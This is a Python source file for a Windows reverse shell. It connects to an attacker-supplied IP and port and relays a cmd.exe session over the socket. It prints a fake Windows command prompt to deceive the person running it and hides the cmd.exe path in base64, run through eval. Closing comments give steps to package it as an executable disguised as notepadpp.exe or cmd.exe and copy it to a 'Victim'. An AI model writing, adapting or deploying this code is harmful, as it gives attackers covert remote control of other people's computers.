import os, sys, socket, subprocess, threading, base64, time

"""
Connect back to home with "cmd.exe"
Reverse cmd shell
"""


def server2process(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)


def process2server(s, p):
    while True:
        s.send(p.stdout.read(1))


"""
Simulate Windows cmd prompt
"""


def fake_prompt():
    os.system("cls")
    """
    Microsoft Windows [Version 10.0.17134.1069]
    TWljcm9zb2Z0IFdpbmRvd3MgW1ZlcnNpb24gMTAuMC4xNzEzNC4xMDY5XQ==
    
    (c) 2018 Microsoft Corporation. All rights reserved.
    KGMpIDIwMTggTWljcm9zb2Z0IENvcnBvcmF0aW9uLiBBbGwgcmlnaHRzIHJlc2VydmVkLg==
    """
    sys.stdout.write(
        str((base64.b64decode("TWljcm9zb2Z0IFdpbmRvd3MgW1ZlcnNpb24gMTAuMC4xNzEzNC4xMDY5XQ==").decode("utf-8"))) + "\n"
        + str((base64.b64decode("KGMpIDIwMTggTWljcm9zb2Z0IENvcnBvcmF0aW9uLiBBbGwgcmlnaHRzIHJlc2VydmVkLg==").decode("utf-8")))
        + "\n\n" + os.getcwd() + ">"
    )

"""
Check arguments
"""

if __name__ == "__main__":
    if len(sys.argv) == 1:
        sys.exit(0)

    if len(sys.argv) == 2:
        if sys.argv[1] == "-h":
            print("\n >>> Reverse SHELL")
            print("\n >>> USAR: python_reverse_shell.py <Remote_IP> <Remote_Port>")
            sys.exit(0)
        sys.exit(0)
    if len(sys.argv) == 3:
        remote_ip = str(sys.argv[1])
        remote_port = int(sys.argv[2])
    else:
        sys.exit(0)

    """
    Begin process to connect back to home :)
    """
    time.sleep(2)
    fake_prompt()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remote_ip, remote_port))

    """
    ## Windows call "cmd.exe"
    #p = subprocess.Popen(["c:\windows\system32\cmd.exe"],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,stdin=subprocess.PIPE,)
    
    ## Converting to Base64 ( simple obfuscation :)
    "c:\windows\system32\cmd.exe"
    ImM6XHdpbmRvd3Ncc3lzdGVtMzJcY21kLmV4ZSI=
    """

    # From Base64 to Original String
    cmd_string = str(
        (base64.b64decode("ImM6XHdpbmRvd3Ncc3lzdGVtMzJcY21kLmV4ZSI=").decode("utf-8"))
    )
    
    time.sleep(2)
    # Call Process and TCP
    p = subprocess.Popen(
        [eval(cmd_string)],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE,
    )
    server2process_thread = threading.Thread(target=server2process, args=[s, p])
    server2process_thread.daemon = True
    server2process_thread.start()

    process2server_thread = threading.Thread(target=process2server, args=[s, p])
    process2server_thread.daemon = True
    process2server_thread.start()

    try:
        p.wait()
    except KeyboardInterrupt:
        s.close()

"""
Python 2
--------
1) Install "Python 2.7" Windows
2) Install "pyinstaller"
C:\Python2\Scripts\> pip.exe install pynstaller

3) Convert from .py to .exe
C:\Python2\Scripts\> pyinstaller.exe c:\python_reverse_shell_p2.py --clean --onefile --console --icon=c:\Windows\System32\cmd.exe --name notepadpp.exe

4) Cambiar nombre "notepadpp.exe" -> "cmd.exe"
5) Copiarlo a Victim
"""
